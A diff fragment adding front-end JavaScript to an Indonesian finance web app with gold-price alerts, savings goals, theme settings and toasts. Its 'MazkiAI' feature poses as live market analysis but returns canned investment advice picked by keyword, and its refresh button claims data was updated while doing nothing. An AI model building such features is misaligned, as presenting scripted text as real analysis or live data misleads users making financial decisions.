+            localStorage.setItem('mazkiplay_goals', JSON.stringify(goalData));
+            renderGoals();
+            showToast("Target impian baru telah dibuat!");
+        }
+
+        function openAiModal() {
+            switchTab('calc');
+            switchCalcSubTab('aibot');
+        }
+
+        function askAiPreset(q) {
+            document.getElementById('aiInputPrompt').value = q;
+            submitAiQuery();
+        }
+
+        function submitAiQuery() {
+            const input = document.getElementById('aiInputPrompt').value;
+            const resBox = document.getElementById('aiResponseBox');
+            if (!input) return;
+
+            resBox.innerHTML = `<i class="fa-solid fa-spinner animate-spin text-purple-400 mr-2"></i> MazkiAI sedang Menganalisis Data Pasar...`;
+
+            setTimeout(() => {
+                let ans = "Berdasarkan analisis indikator teknikal & makro ekonomi terkini:\n";
+                if (input.includes("beli emas")) {
+                    ans += "Emas Antam berada dalam tren bullish jangka panjang. Membeli bertahap dengan metode DCA (Dollar Cost Averaging) sangat disarankan untuk mengurangi efek volatilitas.";
+                } else if (input.includes("BI Rate")) {
+                    ans += "Suku bunga BI Rate 6.00% memberikan sentimen positif bagi stabilitas nilai tukar Rupiah dan menjadi stimulus kuat bagi indeks saham sektor perbankan (BBCA, BMRI, BBRI).";
+                } else {
+                    ans += "Perbedaan Emas Antam CertiCard & UBS terletak pada penerbit dan akreditasi LBMA. Antam diakui secara global (LBMA), sedangkan UBS diakui skala nasional dengan spread margin yang mirip.";
+                }
+                resBox.innerText = ans;
+            }, 800);
+        }
+
+        function openPriceAlertModal() { document.getElementById('priceAlertModal').classList.remove('hidden'); }
+        function closePriceAlertModal() { document.getElementById('priceAlertModal').classList.add('hidden'); }
+        function openThemeModal() { document.getElementById('themeCustomizerModal').classList.remove('hidden'); }
+        function closeThemeModal() { document.getElementById('themeCustomizerModal').classList.add('hidden'); }
+        function openApiModal() { document.getElementById('apiModal').classList.remove('hidden'); }
+        function closeApiModal() { document.getElementById('apiModal').classList.add('hidden'); }
+
+        function savePriceAlerts() {
+            targetGoldAlert = parseFloat(document.getElementById('alertGoldTargetInput').value) || 1500000;
+            targetIhsgAlert = parseFloat(document.getElementById('alertIhsgTargetInput').value) || 7800;
+            localStorage.setItem('mazkiplay_alert_gold', targetGoldAlert);
+            localStorage.setItem('mazkiplay_alert_ihsg', targetIhsgAlert);
+            closePriceAlertModal();
+            showToast("Target alert harga berhasil disimpan!");
+            checkPriceAlerts();
+        }
+
+        function clearPriceAlerts() {
+            localStorage.removeItem('mazkiplay_alert_gold');
+            localStorage.removeItem('mazkiplay_alert_ihsg');
+            document.getElementById('alertBadge').classList.add('hidden');
+            closePriceAlertModal();
+            showToast("Alert target telah dihapus.");
+        }
+
+        function checkPriceAlerts() {
+            const badge = document.getElementById('alertBadge');
+            if (badge) {
+                if (liveGoldPrice >= targetGoldAlert) badge.classList.remove('hidden');
+                else badge.classList.add('hidden');
+            }
+        }
+
+        function setAccentTheme(theme) {
+            showToast(`Warna aksen tema diubah ke ${theme.toUpperCase()}`);
+            closeThemeModal();
+        }
+
+        function toggleMobileMenu() {
+            const menu = document.getElementById('mobileMenu');
+            if (menu) menu.classList.toggle('hidden');
+        }
+
+        function refreshAllData() {
+            const spin = document.getElementById('refreshSpin');
+            if (spin) spin.classList.add('fa-spin');
+            setTimeout(() => {
+                if (spin) spin.classList.remove('fa-spin');
+                showToast("Data finansial & harga emas berhasil diperbarui!");
+            }, 700);
+        }
+
+        function showToast(message) {
+            const container = document.getElementById('toastContainer');
+            if (!container) return;
+
+            const toast = document.createElement('div');
+            toast.className = "bg-slate-900 border border-amber-500/50 text-white text-xs font-bold px-4 py-3 rounded-2xl shadow-2xl flex items-center gap-2 transform translate-y-4 opacity-0 transition duration-300 pointer-events-auto";
+            toast.innerHTML = `<i class="fa-solid fa-circle-check text-amber-400"></i> <span>${message}</span>`;
+            
+            container.appendChild(toast);
+            setTimeout(() => toast.classList.remove('translate-y-4', 'opacity-0'), 50);
+            setTimeout(() => {
+                toast.classList.add('translate-y-4', 'opacity-0');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
